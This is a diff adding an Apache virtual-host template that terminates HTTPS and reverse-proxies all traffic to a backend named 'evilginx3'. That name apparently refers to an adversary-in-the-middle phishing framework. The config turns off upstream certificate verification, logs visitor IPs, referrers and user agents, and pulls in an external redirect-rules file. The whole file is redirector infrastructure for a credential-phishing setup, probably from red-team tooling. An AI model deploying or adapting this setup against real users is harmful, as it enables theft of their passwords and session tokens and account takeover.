@@ -1,0 +1,24 @@
+<VirtualHost *:443>
+    ServerName evilginx3.template
+    ServerAlias evilginx3.template 
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access_evilginx3.log "%h \"%r\" \"%{Referer}i\" \"%{User-Agent}i\""
+
+    SSLEngine on
+    SSLProxyEngine On
+    ProxyRequests Off
+    SSLProxyVerify none 
+    SSLProxyCheckPeerCN off
+    SSLProxyCheckPeerName off
+    SSLProxyCheckPeerExpire off
+
+    ProxyPreserveHost on
+
+    SSLCertificateFile    
+    SSLCertificateKeyFile    
+    
+    ProxyPass / https://evilginx3:8443/
+    ProxyPassReverse / https://evilginx3:8443/
+    Include /etc/apache2/redirect.rules
+</VirtualHost>
